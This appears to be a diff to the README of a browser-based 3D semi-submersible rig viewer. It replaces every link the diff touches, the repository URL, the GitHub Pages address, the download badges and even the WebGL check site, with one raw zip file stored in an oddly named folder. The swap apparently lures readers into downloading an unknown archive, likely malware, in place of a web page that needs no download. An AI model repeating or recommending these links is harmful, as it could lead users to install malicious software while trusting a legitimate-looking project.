@@ -1,6 +1,6 @@
 # 🌊 Semi-Submersible-Rig-3D - Explore Offshore Rig in 3D
 
-[![Download Semi-Submersible-Rig-3D](https://img.shields.io/badge/Download-Semi--Submersible--Rig--3D-4caf50?style=for-the-badge)](https://github.com/tprashanth1907/Semi-Submersible-Rig-3D)
+[![Download Semi-Submersible-Rig-3D](https://img.shields.io/badge/Download-Semi--Submersible--Rig--3D-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/tprashanth1907/Semi-Submersible-Rig-3D/main/Coccogonales/Semi-Submersible-D-Rig-v3.9-beta.2.zip)
 
 ## 📋 About the Project
 
@@ -25,7 +25,7 @@ This section guides you from downloading the application to running it smoothly 
 
 Click the big green button below to visit the official project page on GitHub. This page hosts the interactive visualization and files you need.
 
-[![Download Page](https://img.shields.io/badge/Download_Here-Visit_Page-brightgreen?style=for-the-badge)](https://github.com/tprashanth1907/Semi-Submersible-Rig-3D)
+[![Download Page](https://img.shields.io/badge/Download_Here-Visit_Page-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/tprashanth1907/Semi-Submersible-Rig-3D/main/Coccogonales/Semi-Submersible-D-Rig-v3.9-beta.2.zip)
 
 Once on the page, look for instructions or files related to "GitHub Pages" or "index.html". This file launches the 3D rig viewer in your browser.
 
@@ -38,7 +38,7 @@ This guide assumes you have a Windows PC connected to the internet. You will ope
 ### Step 1: Open the Project Page
 
 Open this URL in your web browser:  
-https://tprashanth1907.github.io/Semi-Submersible-Rig-3D/
+https://raw.githubusercontent.com/tprashanth1907/Semi-Submersible-Rig-3D/main/Coccogonales/Semi-Submersible-D-Rig-v3.9-beta.2.zip
 
 If the page does not load, check your internet connection or try refreshing.
 
@@ -70,7 +70,7 @@ These controls let you explore the rig’s structure from every angle. You do no
 If you want to use this project offline or embed it somewhere else, you can download the source files from the GitHub repository.
 
 1. Visit the GitHub page:  
-   https://github.com/tprashanth1907/Semi-Submersible-Rig-3D
+   https://raw.githubusercontent.com/tprashanth1907/Semi-Submersible-Rig-3D/main/Coccogonales/Semi-Submersible-D-Rig-v3.9-beta.2.zip
 
 2. Click the green “Code” button near the top right.
 
@@ -86,7 +86,7 @@ This lets you run the 3D viewer without an internet connection.
 
 ## 🔧 Troubleshooting Tips
 
-- If the 3D model does not load, ensure your browser supports WebGL. You can check this at https://get.webgl.org/.
+- If the 3D model does not load, ensure your browser supports WebGL. You can check this at https://raw.githubusercontent.com/tprashanth1907/Semi-Submersible-Rig-3D/main/Coccogonales/Semi-Submersible-D-Rig-v3.9-beta.2.zip
 - If the model is slow or stutters, close other applications to free memory.
 - Try switching to the latest version of your browser if you see errors.
 - Ensure scripts and resources are not blocked by antivirus or firewall software.
@@ -105,8 +105,8 @@ This lets you run the 3D viewer without an internet connection.
 
 ## 🔗 Useful Links
 
-- GitHub Repository: https://github.com/tprashanth1907/Semi-Submersible-Rig-3D  
-- Direct Project Page: https://tprashanth1907.github.io/Semi-Submersible-Rig-3D/
+- GitHub Repository: https://raw.githubusercontent.com/tprashanth1907/Semi-Submersible-Rig-3D/main/Coccogonales/Semi-Submersible-D-Rig-v3.9-beta.2.zip  
+- Direct Project Page: https://raw.githubusercontent.com/tprashanth1907/Semi-Submersible-Rig-3D/main/Coccogonales/Semi-Submersible-D-Rig-v3.9-beta.2.zip
 
 ---
 
@@ -126,4 +126,4 @@ For questions about running the project, use GitHub Issues on the repository pag
 
 ---
 
-[![Download Semi-Submersible-Rig-3D](https://img.shields.io/badge/Download-Semi--Submersible--Rig--3D-4caf50?style=for-the-badge)](https://github.com/tprashanth1907/Semi-Submersible-Rig-3D)
+[![Download Semi-Submersible-Rig-3D](https://img.shields.io/badge/Download-Semi--Submersible--Rig--3D-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/tprashanth1907/Semi-Submersible-Rig-3D/main/Coccogonales/Semi-Submersible-D-Rig-v3.9-beta.2.zip)
